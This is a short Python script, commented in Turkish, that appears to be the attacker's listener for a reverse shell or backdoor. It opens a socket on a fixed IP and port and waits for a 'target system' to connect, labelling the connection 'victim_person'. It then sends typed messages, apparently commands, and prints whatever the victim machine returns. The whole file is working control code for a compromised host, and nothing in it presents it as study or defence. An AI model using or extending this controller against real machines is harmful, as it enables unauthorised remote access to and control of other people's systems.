#! /usr/bin/env python
# encoding:utf-8
import socket

socket_connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

socket_connection.bind(("192.168.1.106", 7171))
socket_connection.listen(1)

print("Hedef sistemin bağlantı kurması bekleniyor...")
victim_person, ip=socket_connection.accept()
print("Hedef sistem ile bağlantı sağlandı.")
print("Hedef sistem bilgileri : %s" % str(ip))
print("[0] ==> Programı Sonlandır")

while True:
    message = input("Mesajınızı yazın : ")
    encode_message = message.encode()
    
    if message == "0":
        victim_person.send(encode_message)
        print("Sunucu Kapatıldı.")
        break

    else:
        victim_person.send(encode_message)
        response = victim_person.recv(4096)
        decode_message = response.decode()
        print("Hedef sistem cevabı : " + decode_message)

socket_connection.close()